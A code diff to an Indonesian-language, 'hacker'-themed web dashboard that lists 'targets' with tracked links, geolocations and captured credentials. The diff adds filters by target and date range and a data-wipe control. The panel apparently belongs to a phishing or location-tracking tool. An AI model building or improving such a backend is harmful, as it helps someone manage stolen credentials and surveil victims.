@@ -25,6 +25,24 @@
                 <p style="color: var(--error-color); font-size: 14px;">Tindakan di bawah ini bersifat permanen dan tidak dapat diurungkan.</p>
                 <button onclick="deleteAllData()" class="hacker-button red" style="width: 100%;">[ WIPE ALL TRACKING DATA ]</button>
             </div>
+            
+            <div class="dashboard-panel">
+                <h1 class="main-title">> FILTER_&_SEARCH</h1>
+                <div class="input-group">
+                    <label for="filter-target">> Search by Target ID:</label>
+                    <input type="text" id="filter-target" class="hacker-input" placeholder="Enter target name...">
+                </div>
+                <div class="input-group">
+                    <label for="filter-start-date">> Start Date:</label>
+                    <input type="date" id="filter-start-date" class="hacker-input">
+                </div>
+                <div class="input-group">
+                    <label for="filter-end-date">> End Date:</label>
+                    <input type="date" id="filter-end-date" class="hacker-input">
+                </div>
+                <button id="apply-filter-btn" class="hacker-button">[ APPLY FILTER ]</button>
+                <button id="reset-filter-btn" class="hacker-button small" style="width:100%; margin-top:10px;">[ RESET ]</button>
+            </div>
         </div>
 
         <div class="panel-right">
@@ -137,12 +155,11 @@
             container.innerHTML = html;
         }
         
-        // --- [FUNGSI BARU] UNTUK MENGHAPUS DATA ---
         async function deleteLocation(id, element) {
             if (confirm(`Anda yakin ingin menghapus data lokasi dengan ID: ${id}?`)) {
                 try {
                     await fetchProtected(`/api/alldata/location/${id}`, { method: 'DELETE' });
-                    element.closest('tr').remove(); // Hapus baris dari tabel
+                    element.closest('tr').remove();
                 } catch (error) {
                     alert(`Gagal menghapus data: ${error.message}`);
                 }
@@ -153,7 +170,7 @@
             if (confirm(`Anda yakin ingin menghapus data kredensial dengan ID: ${id}?`)) {
                 try {
                     await fetchProtected(`/api/alldata/credential/${id}`, { method: 'DELETE' });
-                    element.closest('tr').remove(); // Hapus baris dari tabel
+                    element.closest('tr').remove();
                 } catch (error) {
                     alert(`Gagal menghapus data: ${error.message}`);
                 }
@@ -168,7 +185,7 @@
                     try {
                         await fetchProtected('/api/alldata/all', { method: 'DELETE' });
                         alert('Semua data pelacakan berhasil dihapus.');
-                        location.reload(); // Muat ulang halaman untuk melihat tabel kosong
+                        location.reload();
                     } catch (error) {
                         alert(`Gagal menghapus semua data: ${error.message}`);
                     }
@@ -176,10 +193,34 @@
             }
         }
 
+        function loadAllData() {
+            const target = document.getElementById('filter-target').value;
+            const startDate = document.getElementById('filter-start-date').value;
+            const endDate = document.getElementById('filter-end-date').value;
+
+            const params = new URLSearchParams();
+            if (target) params.append('target', target);
+            if (startDate) params.append('startDate', startDate);
+            if (endDate) params.append('endDate', endDate);
+            
+            const queryString = params.toString();
+
+            fetchProtected(`/api/alldata/links?${queryString}`).then(renderLinksTable);
+            fetchProtected(`/api/alldata/locations?${queryString}`).then(renderLocationsTable);
+            fetchProtected(`/api/alldata/credentials?${queryString}`).then(renderCredentialsTable);
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
-            fetchProtected('/api/alldata/links').then(renderLinksTable).catch(err => console.error("Error fetching links:", err));
-            fetchProtected('/api/alldata/locations').then(renderLocationsTable).catch(err => console.error("Error fetching locations:", err));
-            fetchProtected('/api/alldata/credentials').then(renderCredentialsTable).catch(err => console.error("Error fetching credentials:", err));
+            loadAllData(); 
+
+            document.getElementById('apply-filter-btn').addEventListener('click', loadAllData);
+
+            document.getElementById('reset-filter-btn').addEventListener('click', () => {
+                document.getElementById('filter-target').value = '';
+                document.getElementById('filter-start-date').value = '';
+                document.getElementById('filter-end-date').value = '';
+                loadAllData();
+            });
         });
     </script>
 </body>
